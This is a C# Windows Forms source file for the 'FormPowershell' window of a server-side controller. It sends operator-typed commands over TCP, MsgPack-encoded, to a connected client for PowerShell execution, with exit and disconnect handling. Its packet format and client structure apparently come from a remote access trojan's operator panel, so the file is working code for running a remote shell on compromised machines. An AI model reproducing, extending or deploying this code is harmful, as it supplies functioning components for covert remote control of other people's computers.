using Server.MessagePack;
using Server.Connection;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Server.Forms
{
    public partial class FormPowershell : Form
    {
        public Form1 F { get; set; }
        internal Clients Client { get; set; }
        internal Clients ParentClient { get; set; }

        public FormPowershell()
        {
            InitializeComponent();
        }

        private void TextBox1_KeyDown(object sender, KeyEventArgs e)
        {
            if (Client != null)
            if (e.KeyData == Keys.Enter && !string.IsNullOrWhiteSpace(textBox1.Text))
            {
                if (textBox1.Text == "cls".ToLower())
                {
                    richTextBox1.Clear();
                    textBox1.Clear();
                }
                if (textBox1.Text == "exit".ToLower())
                {
                    try
                    {
                        MsgPack pack = new MsgPack();
                        pack.ForcePathObject("Pac_ket").AsString = "nps";
                        pack.ForcePathObject("Send").AsString = "Exit";
                        ThreadPool.QueueUserWorkItem(Client.Send, pack.Encode2Bytes());
                        ThreadPool.QueueUserWorkItem((o) =>
                        {
                            Client?.Disconnected();
                        });
                    }
                    catch { }
                    this.Close();
                }
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "nps";
                msgpack.ForcePathObject("Send").AsString = "WriteInput";
                msgpack.ForcePathObject("Command").AsString = textBox1.Text;
                ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
                textBox1.Clear();
            }
        }

        private void FormPowershell_FormClosed(object sender, FormClosedEventArgs e)
        {
            try
            {
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "nps";
                msgpack.ForcePathObject("Send").AsString = "Exit";
                ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());

                ThreadPool.QueueUserWorkItem((o) =>
                {
                    Client?.Disconnected();
                });
            }
            catch { }
        }

        private void Timer1_Tick(object sender, EventArgs e)
        {
            try
            {
                if (!Client.TcpClient.Connected || !ParentClient.TcpClient.Connected) this.Close();
            }
            catch { this.Close(); }
        }
    }
}
